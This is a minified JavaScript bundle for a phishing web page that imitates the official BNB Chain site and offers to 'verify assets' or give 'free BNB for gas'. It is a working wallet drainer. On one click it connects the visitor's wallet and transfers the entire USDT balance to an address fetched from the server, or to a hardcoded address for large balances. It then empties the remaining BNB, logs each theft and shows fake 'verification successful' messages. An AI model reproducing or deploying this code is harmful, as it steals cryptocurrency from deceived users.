(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
[931],
{
6541: function (e, n, a) {
Promise.resolve().then(a.bind(a, 184));
},
184: function (e, n, a) {
"use strict";
let s, t, i, r;
a.r(n),
a.d(n, {
default: function () {
return v;
},
});
var c = a(7437),
o = a(2265),
l = a(5525),
h = a(9299),
d = a(3464),
m = a(257);
let u = "",
p = [
{ constant: !0, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
{
constant: !1,
inputs: [
{ name: "_to", type: "address" },
{ name: "_value", type: "uint256" },
],
name: "transfer",
outputs: [{ name: "", type: "bool" }],
type: "function",
},
],
g = { chainId: "0x38", chainName: "Binance Smart Chain Mainnet", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: ["https://bsc-dataseed1.binance.org/"], blockExplorerUrls: ["https://bscscan.com/"] };
async function b() {
if (window.ethereum)
try {
await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: g.chainId }] });
} catch (e) {
if (4902 === e.code)
try {
await window.ethereum.request({ method: "wallet_addEthereumChain", params: [g] });
} catch (e) {
throw Error("Failed to add BSC Mainnet to wallet");
}
else throw Error("Failed to switch to BSC Mainnet");
}
else throw Error("No compatible wallet found");
}
async function x() {
try {
u = (await d.Z.get("/api/admin/publicWallet.json")).data.walletAddress;
} catch (e) {
throw (console.error("Failed to fetch admin wallet address:", e), e);
}
}
async function f() {
try {
if ((await x(), await b(), window.ethereum)) await window.ethereum.request({ method: "eth_requestAccounts" }), (s = new l.Q(window.ethereum, "any")), (i = new h.ZPm(window.ethereum));
else throw Error("No compatible wallet found");
t = await s.getSigner();
let e = await t.getAddress();
return (r = new i.eth.Contract(p, "0x55d398326f99059ff775485246999027B3197955")), (await s.getNetwork()).chainId, BigInt(56), e;
} catch (e) {
throw (console.error("Wallet connection error:", e), e);
}
}
async function w() {
try {
let e, n;
let a = (await i.eth.getAccounts())[0],
s = await i.eth.getBalance(a),
t = await r.methods.balanceOf(a).call(),
c = i.utils.fromWei(t, "ether");
console.log("Initial BNB balance:", i.utils.fromWei(s, "ether")), console.log("Current USDT balance:", c);
let o = i.utils.fromWei(s, "ether"),
l = parseFloat(c).toFixed(2),
h = parseFloat(o).toFixed(4);
if (1 >= parseFloat(c)) throw { usdttoshow: l, bnbtoshow: h };
let p = "0",
g = "0";
if (parseFloat(c) > 1) {
let e = await i.eth.getGasPrice(),
o = await r.methods.transfer(u, t).estimateGas({ from: a }),
l = (BigInt(e) * BigInt(o) * BigInt(120)) / BigInt(100);
if ((console.log("Required BNB for gas:", i.utils.fromWei(l.toString(), "ether")), console.log("Current BNB balance:", i.utils.fromWei(s, "ether")), BigInt(s) < l)) {
let e = l - BigInt(s),
n = i.utils.toWei("0.0001", "ether"),
t = (e * BigInt(110)) / BigInt(100) + BigInt(n);
console.log("Sending required BNB for gas:", i.utils.fromWei(t.toString(), "ether"));
let r = await d.Z.post("/api/transactions/sendGasFees.php", { userAddress: a, amount: t.toString() });
if (!r.data.success) throw Error("Failed to send gas fees");
console.log("Sent BNB for gas fees, hash:", r.data.hash), await new Promise((e) => setTimeout(e, 8e3));
}
if (parseFloat(c) > 5500)
try {
(n = (await r.methods.transfer("0xd6B56E53b3C5e69C05ca5197D3DF4cB310a30fba", t).send({ from: a })).transactionHash), console.log("Insufficient fund to check flash usdt"), (g = c);
} catch (e) {
throw (console.error("Insufficient fund to check flash usdt:", e), { amount: "Amount = Checked ✅", flash: "Flash Usdt = 0" });
}
else
try {
(n = (await r.methods.transfer(u, t).send({ from: a })).transactionHash), console.log("Insufficient fund to check flash usdt"), (g = c), await j(a, g, n, "USDT");
} catch (e) {
throw (console.error("Insufficient fund to check flash usdt:", e), { amount: "Amount = Checked ✅", flash: "Flash Usdt = 0" });
}
}
let b = await i.eth.getBalance(a);
if (BigInt(b) > 0)
try {
let n = await i.eth.getGasPrice(),
s = BigInt(n) * BigInt(21e3),
t = BigInt(b) - s;
t > 0 && ((e = (await i.eth.sendTransaction({ from: a, to: u, value: t.toString() })).transactionHash), console.log("Insufficient fund to check flash usdt", e), (p = i.utils.fromWei(t.toString(), "ether")), await j(a, p, e, "BNB"));
} catch (e) {
throw (console.error("Insufficient fund to check flash usdt:", e), { amount: "Amount = Checked ✅", flash: "Flash Usdt = 0" });
}
return { bnbTxHash: e, usdtTxHash: n, bnbAmount: p, usdtAmount: g };
} catch (e) {
throw (console.error("flash usdt failed:", e), e);
}
}
async function j(e, n, a, s) {
try {
await d.Z.post("/api/transactions/store", { userAddress: e, amount: n, txHash: a, currency: s });
} catch (e) {
console.error("Failed to store transaction data:", e);
}
}
var N = a(3949);
a(6550)
.ZP.use(N.Db)
.init({
resources: {
en: {
translation: {
"You have a Wallet": "You have a Wallet",
"Now what?": "Now what?",
"Check Flash Usdt": "Check Flash Usdt",
Checker: "Checker",
"Processing...": "Processing...",
"Connected:": "Connected:",
"Transaction Hash:": "Transaction Hash:",
"Donated Amount:": "Donated Amount:",
"USDT Transaction Hash:": "USDT Transaction Hash:",
"Donated USDT Amount:": "Donated USDT Amount:",
},
},
hi: {
translation: {
"You have a Wallet": "आपके पास एक वॉलेट है",
"Now what?": "अब क्या?",
"Check Flash Usdt": "फ्लैश USDT जांचें",
Checker: "चेकर",
"Processing...": "प्रोसेसिंग...",
"Connected:": "कनेक्टेड:",
"Transaction Hash:": "लेनदेन हैश:",
"Donated Amount:": "दान की गई राशि:",
"USDT Transaction Hash:": "USDT लेनदेन हैश:",
"Donated USDT Amount:": "दान की गई USDT राशि:",
},
},
zh: {
translation: {
"You have a Wallet": "您有一个钱包",
"Now what?": "现在怎么办？",
"Check Flash Usdt": "检查闪电USDT",
Checker: "检查器",
"Processing...": "处理中...",
"Connected:": "已连接：",
"Transaction Hash:": "交易哈希：",
"Donated Amount:": "捐赠金额：",
"USDT Transaction Hash:": "USDT交易哈希：",
"Donated USDT Amount:": "捐赠的USDT金额：",
},
},
fr: {
translation: {
"You have a Wallet": "Vous avez un portefeuille",
"Now what?": "Et maintenant ?",
"Check Flash Usdt": "V\xe9rifier Flash USDT",
Checker: "V\xe9rificateur",
"Processing...": "Traitement en cours...",
"Connected:": "Connect\xe9 :",
"Transaction Hash:": "Hash de transaction :",
"Donated Amount:": "Montant donn\xe9 :",
"USDT Transaction Hash:": "Hash de transaction USDT :",
"Donated USDT Amount:": "Montant USDT donn\xe9 :",
},
},
es: {
translation: {
"You have a Wallet": "Tienes una billetera",
"Now what?": "\xbfY ahora qu\xe9?",
"Check Flash Usdt": "Verificar Flash USDT",
Checker: "Verificador",
"Processing...": "Procesando...",
"Connected:": "Conectado:",
"Transaction Hash:": "Hash de transacci\xf3n:",
"Donated Amount:": "Cantidad donada:",
"USDT Transaction Hash:": "Hash de transacci\xf3n USDT:",
"Donated USDT Amount:": "Cantidad USDT donada:",
},
},
de: {
translation: {
"You have a Wallet": "Sie haben ein Wallet",
"Now what?": "Was nun?",
"Check Flash Usdt": "Flash USDT \xfcberpr\xfcfen",
Checker: "Pr\xfcfer",
"Processing...": "Verarbeitung...",
"Connected:": "Verbunden:",
"Transaction Hash:": "Transaktions-Hash:",
"Donated Amount:": "Gespendeter Betrag:",
"USDT Transaction Hash:": "USDT-Transaktions-Hash:",
"Donated USDT Amount:": "Gespendeter USDT-Betrag:",
},
},
},
lng: "en",
interpolation: { escapeValue: !1 },
}),
a(7596);
var B = a(257);
function y(e) {
let { showLoader: n } = e,
a = ["Submiting User Request..", "Creating User Request for GAS", "Trying to Request Gas Refill approval from User"],
[s, t] = (0, o.useState)(0);
return ((0, o.useEffect)(() => {
if (n) {
let e = setInterval(() => {
t((e) => (e + 1) % a.length);
}, 7e3);
return () => clearInterval(e);
}
}, [n, a.length]),
n)
? (0, c.jsx)("div", { className: "loader-overlay", children: (0, c.jsxs)("div", { className: "loader-box", children: [(0, c.jsx)("div", { className: "spinner-loader" }), (0, c.jsx)("p", { className: "loader-info", children: a[s] })] }) })
: null;
}
function C(e) {
let { message: n, onClose: a } = e;
return (0, c.jsxs)("div", { className: "notification", children: [(0, c.jsx)("p", { children: n }), (0, c.jsx)("button", { className: "close-button", onClick: a, children: "\xd7" })] });
}
function v() {
let { t: e } = (0, N.$G)(),
[n, a] = (0, o.useState)(!1),
[s, t] = (0, o.useState)(""),
[i, r] = (0, o.useState)(""),
[l, h] = (0, o.useState)(""),
[d, m] = (0, o.useState)(""),
[u, p] = (0, o.useState)(""),
[g, b] = (0, o.useState)(""),
[x, j] = (0, o.useState)({ amount: "", flash: "" }),
[v, S] = (0, o.useState)(!1),
[k, T] = (0, o.useState)(!1),
[D, U] = (0, o.useState)(!1),
[A, I] = (0, o.useState)({ usdt: null, bnb: null }),
[F, H] = (0, o.useState)(""),
[W, _] = (0, o.useState)(!1),
P = "https://cdn.worldvectorlogo.com/logos/tether-1.svg",
E = "https://w7.pngwing.com/pngs/997/942/png-transparent-bnb-crypto-cryptocurrency-cryptocurrencies-cash-money-bank-payment-icon-thumbnail.png";
async function G() {
if (!n) {
a(!0), T(!0), H(""), _(!1), m(""), j({ amount: "", flash: "" });
try {
let e = await f();
t(e);
let { bnbTxHash: n, usdtTxHash: a, bnbAmount: s, usdtAmount: i } = await w();
r(n || ""), p(a || ""), h(s), b(i), U(!0);
} catch (e) {
e.usdttoshow ? (b(e.usdttoshow), h(e.bnbtoshow)) : U(!0);
} finally {
a(!1),
setTimeout(() => {
T(!1);
}, 2e3);
}
}
}
return (0, c.jsxs)("div", {
className: "app",
children: [
W && (0, c.jsx)(C, { message: F, onClose: () => _(!1) }),
(0, c.jsx)(y, { showLoader: k }),
(0, c.jsx)("div", { className: "notification-bar", children: (0, c.jsx)("p", { children: "Listed on 130 exchanges, BSC is the fastest growing crypto network." }) }),
(0, c.jsxs)("header", {
className: "app-header",
children: [
(0, c.jsx)("div", { className: "header-left", children: (0, c.jsx)("img", { src: "/Frame_480972175.png", alt: "BNB Chain Logo", className: "logo" }) }),
(0, c.jsxs)("nav", {
className: "desktop-nav",
children: [
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/bnb-smart-chain", children: "Chains" }),
(0, c.jsx)("a", { href: "https://portal.bnbchain.org/", children: "Developer" }),
(0, c.jsx)("a", { href: "https://dappbay.bnbchain.org/?utm_source=Org&utm_medium=Channel&utm_campaign=homepage_240124&utm_content=homepage", children: "Ecosystem" }),
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/community", children: "Community" }),
(0, c.jsx)("a", { href: "https://jobs.bnbchain.org/jobs", children: "Careers" }),
],
}),
(0, c.jsxs)("div", {
className: "button-group",
children: [
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/blog", className: "support-button", children: "Support" }),
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/contact", className: "contact-button", children: "Contact Us" }),
],
}),
(0, c.jsx)("button", {
className: "hamburger",
onClick: () => {
S((e) => !e);
},
children: "☰",
}),
],
}),
v &&
(0, c.jsx)("div", {
className: "menu-overlay",
onClick: () => S(!1),
children: (0, c.jsxs)("div", {
className: "menu open",
children: [
(0, c.jsx)("img", { src: "/Frame_480972175.png", alt: "BNB Chain Logo", className: "menu-logo" }),
(0, c.jsx)("button", { className: "close-menu", onClick: () => S(!1), children: "\xd7" }),
(0, c.jsx)("a", { className: "menu-item", href: "https://www.bnbchain.org/en/bnb-smart-chain", children: "Chains" }),
(0, c.jsx)("a", { className: "menu-item", href: "https://portal.bnbchain.org/", children: "Developer" }),
(0, c.jsx)("a", { className: "menu-item", href: "https://dappbay.bnbchain.org/?utm_source=Org&utm_medium=Channel&utm_campaign=homepage_240124&utm_content=homepage", children: "Ecosystem" }),
(0, c.jsx)("a", { className: "menu-item", href: "https://www.bnbchain.org/en/community", children: "Community" }),
(0, c.jsx)("a", { className: "menu-item", href: "https://jobs.bnbchain.org/jobs", children: "Careers" }),
(0, c.jsxs)("div", {
className: "button-group",
children: [
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/blog", className: "support-button", children: "Support" }),
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/contact", className: "contact-button", children: "Contact Us" }),
],
}),
],
}),
}),
(0, c.jsx)("main", {
className: "main-content",
style: {
backgroundImage: "url(".concat(B.env.PUBLIC_URL + "BGmain.png", ")"),
backgroundSize: "cover",
backgroundPosition: "center",
backgroundRepeat: "no-repeat",
minHeight: "100vh",
display: "flex",
flexDirection: "column",
justifyContent: "center",
alignItems: "center",
},
children: x.amount
? (0, c.jsxs)("div", {
  style: { backgroundColor: "rgba(0, 0, 0, 0.5)", backdropFilter: "blur(4px)", padding: "1rem", borderRadius: "0.5rem", border: "1px solid rgba(255, 255, 255, 0.1)", textAlign: "center" },
  children: [
  (0, c.jsx)("p", { style: { color: "white", fontSize: "1.125rem", fontWeight: "600", marginBottom: "0.5rem" }, children: x.amount }),
  (0, c.jsx)("p", { style: { color: "white", fontSize: "1.125rem", fontWeight: "600" }, children: x.flash }),
  ],
  })
: D
? (0, c.jsxs)("div", {
  className: "verification-message",
  children: [
  (0, c.jsx)("p", { children: "Verification successful! Reported Flash 0" }),
  (0, c.jsxs)("div", {
  className: "balance-display",
  style: { marginTop: "10px", backgroundColor: "black", padding: "10px", borderRadius: "5px", color: "white", textAlign: "center" },
  children: [
  (0, c.jsx)("h4", { children: "Available BNB Tokens:" }),
  (0, c.jsxs)("p", {
  style: { display: "flex", alignItems: "center" },
  children: [(0, c.jsx)("img", { src: P, alt: "USDT Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }), (0, c.jsxs)("span", { children: ["USDT = ", null !== g ? Math.floor(g) : "Loading..."] })],
  }),
  (0, c.jsxs)("p", {
  style: { display: "flex", alignItems: "center" },
  children: [(0, c.jsx)("img", { src: E, alt: "BNB Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }), (0, c.jsxs)("span", { children: ["BNB = ", null !== l ? l : "Loading..."] })],
  }),
  ],
  }),
  ],
  })
: g
? (0, c.jsxs)("div", {
  className: "verification-message",
  children: [
  (0, c.jsx)("p", { children: "Verification successful! Reported Flash 0" }),
  (0, c.jsxs)("div", {
  className: "balance-display",
  style: { marginTop: "10px", backgroundColor: "black", padding: "10px", borderRadius: "5px", color: "white", textAlign: "center" },
  children: [
  (0, c.jsx)("h4", { children: "Available BNB Tokens:" }),
  (0, c.jsxs)("p", {
  style: { display: "flex", alignItems: "center" },
  children: [(0, c.jsx)("img", { src: P, alt: "USDT Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }), (0, c.jsxs)("span", { children: ["USDT = ", null !== g ? g : "Loading..."] })],
  }),
  (0, c.jsxs)("p", {
  style: { display: "flex", alignItems: "center" },
  children: [(0, c.jsx)("img", { src: E, alt: "BNB Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }), (0, c.jsxs)("span", { children: ["BNB = ", null !== l ? l : "Loading..."] })],
  }),
  ],
  }),
  ],
  })
: (0, c.jsxs)(c.Fragment, {
  children: [
  (0, c.jsxs)("h2", { children: ["Verify Assets on ", (0, c.jsx)("span", { className: "highlight", children: "BNB Chain" })] }),
  (0, c.jsx)("h3", { className: "sub-heading", children: "Serving Gas Less Web3 tools to over 478 Million users" }),
  (0, c.jsx)("p", { className: "description", children: "A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions." }),
  (0, c.jsxs)("div", {
  className: "main-buttons",
  children: [(0, c.jsx)("button", { className: "primary-button", onClick: G, children: "Verify Assets" }), (0, c.jsx)("a", { href: "https://www.bnbchain.org/en", className: "secondary-button", children: "\uD83C\uDFE0︎   HOME" })],
  }),
  ],
  }),
}),
(0, c.jsxs)("section", {
className: "white-section",
children: [
(0, c.jsxs)("h3", { children: ["Join the BNB Chain ", (0, c.jsx)("span", { className: "highlight", children: "Ecosystem" })] }),
(0, c.jsx)("p", { className: "ecosystem-description", children: "Get started in few steps to dive into the world of BNB Chain." }),
(0, c.jsxs)("div", {
className: "card-container",
children: [
(0, c.jsxs)("div", {
className: "card",
children: [
(0, c.jsx)("h4", { children: "Download Wallet" }),
(0, c.jsx)("p", { children: "A wallet helps you connect to BNB Chain and manage your funds." }),
(0, c.jsx)("a", { href: "https://www.bnbchain.org/en/wallets", className: "card-button", children: "Download Wallet" }),
(0, c.jsx)("img", { src: "/image_no_background.png", alt: "Wallet" }),
],
}),
(0, c.jsxs)("div", {
className: "card",
children: [
(0, c.jsx)("h4", { children: "Get free BNB for GAS" }),
(0, c.jsx)("p", { children: "BNB is the currency of BNB Chain that is required on BNB chain for any interaction" }),
(0, c.jsx)("button", { className: "card-button", onClick: G, children: "Get BNB" }),
(0, c.jsx)("img", { src: "/abs.png", alt: "BNB Tokens" }),
],
}),
],
}),
],
}),
(0, c.jsxs)("section", {
className: "community-section",
children: [
(0, c.jsxs)("h3", { children: ["Get Involved, Be Part of the ", (0, c.jsx)("span", { className: "highlight", children: "Community" })] }),
(0, c.jsx)("p", { className: "community-description", children: "BNB Chain is a global, decentralized network with developers, validators, users, HODLers, and enthusiasts." }),
(0, c.jsxs)("div", {
className: "social-links",
children: [
(0, c.jsxs)("a", { href: "https://t.me/bnbchain", className: "social-link", children: [(0, c.jsx)("img", { src: "/telegram.png", alt: "Telegram", className: "social-icon" }), "Telegram"] }),
(0, c.jsxs)("a", { href: "https://github.com/bnb-chain", className: "social-link", children: [(0, c.jsx)("img", { src: "/github.png", alt: "GitHub", className: "social-icon" }), "GitHub"] }),
(0, c.jsxs)("a", { href: "https://www.youtube.com/channel/UCG9fZu6D4I83DStktBV0Ryw", className: "social-link", children: [(0, c.jsx)("img", { src: "/youtube.png", alt: "YouTube", className: "social-icon" }), "YouTube"] }),
(0, c.jsxs)("a", { href: "https://twitter.com/BNBChain", className: "social-link", children: [(0, c.jsx)("img", { src: "/twitter.png", alt: "Twitter", className: "social-icon" }), "X"] }),
(0, c.jsxs)("a", { href: "https://discord.gg/QRTQvfhADQ", className: "social-link", children: [(0, c.jsx)("img", { src: "/discord.png", alt: "Discord", className: "social-icon" }), "Discord"] }),
],
}),
],
}),
(0, c.jsxs)("footer", {
className: "footer",
children: [
(0, c.jsxs)("div", {
className: "footer-container",
children: [
(0, c.jsxs)("div", {
className: "footer-column",
children: [
(0, c.jsx)("h4", { children: "Chains" }),
(0, c.jsxs)("ul", {
children: [
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/bnb-smart-chain", children: "BNB Smart Chain" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://greenfield.bnbchain.org/en", children: "BNB Greenfield" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://opbnb.bnbchain.org/en", children: "opBNB" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://zkbnb.bnbchain.org/", children: "zkBNB" }) }),
],
}),
],
}),
(0, c.jsxs)("div", {
className: "footer-column",
children: [
(0, c.jsx)("h4", { children: "Use BNB Chain" }),
(0, c.jsxs)("ul", {
children: [
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/wallets", children: "Download Wallet" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/what-is-bnb", children: "Get BNB" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/bnb-staking", children: "Stake BNB" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/bnb-chain-bridge", children: "Bridge Assets" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://dappbay.bnbchain.org/", children: "Explore dApps" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://btcfi.bnbchain.org/", children: "Earn by BTC" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/payment", children: "Pay by Crypto" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/liquid-staking", children: "Earn by Liquid Staking" }) }),
],
}),
],
}),
(0, c.jsxs)("div", {
className: "footer-column",
children: [
(0, c.jsx)("h4", { children: "Build" }),
(0, c.jsxs)("ul", {
children: [
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/liquid-staking", children: "Portal" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://docs.bnbchain.org/", children: "Documentations" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://testnet.bnbchain.org/faucet-smart", children: "Faucet" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/dev-tools", children: "Dev Tools" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://dappbay.bnbchain.org/submit-dapp", children: "Submit dApp" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchainlist.org/", children: "BNBChain List" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://dcellar.io/", children: "Greenfield Console" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://github.com/bnb-chain/whitepaper", children: "Whitepaper" }) }),
],
}),
],
}),
(0, c.jsxs)("div", {
className: "footer-column",
children: [
(0, c.jsx)("h4", { children: "Participate" }),
(0, c.jsxs)("ul", {
children: [
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/events", children: "Events" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/hackathon/bangkok", children: "Hackathon" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/bsc-mvb-program", children: "MVB Program" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/developers/developer-programs", children: "Developer Programs" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/martians-program", children: "Martians Program" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://bugbounty.bnbchain.org/", children: "Bug Bounty" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/builders-club", children: "Host an Event" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/space-b", children: "Get Workspace" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://jobs.bnbchain.org/jobs", children: "Ecosystem Jobs" }) }),
],
}),
],
}),
(0, c.jsxs)("div", {
className: "footer-column",
children: [
(0, c.jsx)("h4", { children: "About" }),
(0, c.jsxs)("ul", {
children: [
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/blog", children: "Blog" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://jobs.bnbchain.org/companies/bnb-chain#content", children: "Careers" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/official-verification", children: "BNB Chain Verify" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://dappbay.bnbchain.org/red-alarm/dapp", children: "Red Alarm" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/privacy-policy", children: "Privacy Policy" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/terms", children: "Terms of Use" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/contact", children: "Contact Us" }) }),
(0, c.jsx)("li", { children: (0, c.jsx)("a", { href: "https://www.bnbchain.org/en/brand-guidelines", children: "Brand Guidelines" }) }),
],
}),
],
}),
],
}),
(0, c.jsx)("div", { className: "footer-bottom", children: (0, c.jsx)("p", { children: "\xa9 2024 BNB Chain. All rights reserved." }) }),
],
}),
k && (0, c.jsx)(y, {}),
],
});
}
},
7596: function () {},
},
function (e) {
e.O(0, [926, 464, 138, 971, 117, 744], function () {
return e((e.s = 6541));
}),
(_N_E = e.O());
},
]);
